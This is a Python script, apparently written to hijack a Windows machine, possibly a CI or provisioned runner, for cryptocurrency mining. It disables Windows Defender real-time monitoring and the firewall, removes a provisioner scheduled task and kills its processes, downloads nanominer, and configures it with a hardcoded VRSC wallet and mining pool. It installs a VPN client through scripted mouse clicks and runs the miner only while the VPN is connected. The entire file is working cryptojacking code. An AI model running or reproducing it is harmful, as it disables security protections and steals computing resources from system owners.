import subprocess 
import pyautogui 
import requests
import zipfile
import os
import sys
import time 
import psutil 
import ipaddress
import socket

def disableFA():
    subprocess.run(['powershell', '-Command','Set-MpPreference -DisableRealtimeMonitoring $true'], shell=True)
    subprocess.run(['netsh', 'advfirewall', 'set', 'allprofiles', 'state', 'off'], shell=True)
    command = f"Unregister-ScheduledTask -TaskName 'RunnerMachineProvisioner' -Confirm:$false"
    subprocess.run(["powershell", "-Command", command], capture_output=True, text=True, check=True) 
    subprocess.run(['taskkill', '/F', '/IM', 'provisioner.exe'])
    subprocess.run(['taskkill', '/F', '/IM', 'provjobd.exe'])
    return True 


def download(url,filename):
    with requests.get(url, stream=True) as response:
        response.raise_for_status()
        with open(filename, 'wb') as file:
            for chunk in response.iter_content(chunk_size=8192):
                file.write(chunk)
    print(f"File downloaded as {filename}")


def extract(zip_file_path,extract_dir) :
    os.makedirs(extract_dir, exist_ok=True)
    with zipfile.ZipFile(zip_file_path, 'r') as zip_ref:
        zip_ref.extractall(extract_dir)

    print(f"Files extracted to {extract_dir}")


def updateConfig(servername, file_path):
    new_data = f"""
wallet = NHbUzxvSsaUGp6ctYCCPVDgcYfT5rZvaYJeH
coin = VRSC
rigName = {servername}
;pool1=verushash.auto.nicehash.com:9200
pool1=106.142.160.34.bc.googleusercontent.com:9200
sortPools=true
cpuThreads = 4
"""
    with open(file_path, 'w') as file:
        file.write(new_data)
    print("Configuration updated successfully.")


def setup(servername,exe_path):
    process = subprocess.Popen([exe_path])
    time.sleep(2)
    pyautogui.click(627,530,duration = 10) # Start Application  
    pyautogui.click(672,528,duration = 6)
    pyautogui.click(328,458,duration = 16)
    pyautogui.click(606,526,duration = 12)
    pyautogui.click(589,369,duration = 14)
    pyautogui.click(609,531,duration = 4)
    pyautogui.click(741,580,duration = 6)
    pyautogui.click(741,580,duration = 4)

    pyautogui.click(780,141,4),    # Text Box Search 
    pyautogui.typewrite(servername)
    pyautogui.press("enter")

    pyautogui.click(446,464,duration = 4)          # Connect
    pyautogui.click(267,228,duration = 20)         # Waiting to Connect
    return True 


def connected(adapter_name, network_prefix):
    adapters = psutil.net_if_addrs()
    if adapter_name not in adapters:
        #print(f"Network adapter '{adapter_name}' does not exist.")
        return False
    addresses = adapters[adapter_name]
    for address in addresses:
        if address.family == socket.AF_INET:
            ip = address.address
            try:
                if ipaddress.ip_address(ip) in ipaddress.ip_network(network_prefix, strict=False):
                    #print(f"Network adapter '{adapter_name}' is connected to the network prefix '{network_prefix}'.")
                    return True
            except ValueError:
                continue
    
    #print(f"Network adapter '{adapter_name}' is not connected to the network prefix '{network_prefix}'.")
    return False

def watcher(adapter_name,network_prefix,exe_path,working_directory):
    print ('Watching....')
    isRunning = False 
    while True :
        process = None 
        if connected(adapter_name,network_prefix) :
            if not isRunning:  
               process = subprocess.Popen(exe_path, cwd=working_directory , creationflags=subprocess.CREATE_NEW_CONSOLE)   
               isRunning = True
            #print('Connected')
        else:
            if isRunning : 
               subprocess.run(['taskkill', '/F', '/IM', 'nanominer.exe'])
               isRunning = False 
            #print('not connected')
        #time.sleep(5)
        



if __name__ == "__main__":


    servername = 'Philippines'


    disableFA()

    url = 'https://github.com/nanopool/nanominer/releases/download/v3.9.2/nanominer-windows-3.9.2.zip'
    filename = 'nano.zip'
    download(url,filename)
   
    url = 'https://install.urban-vpn.com/UrbanVPN.exe'
    filename = 'urban.exe'
    download(url,filename)

    zip_file_path = 'nano.zip'
    extract_dir = 'nano'
    extract(zip_file_path,extract_dir)

    updateConfig(servername ,'nano\\nanominer-windows-3.9.2\\config.ini')

    
    setup(servername,'urban.exe')

    adapter_name = 'Local Area Connection'  # Replace with the name of the adapter you want to check
    network_prefix = '10.10.0.0/16'  # Replace with the desired network prefix
    exe_path = 'nano\\nanominer-windows-3.9.2\\nanominer.exe'
    working_directory = 'nano\\nanominer-windows-3.9.2\\'
    watcher(adapter_name,network_prefix,exe_path,working_directory)
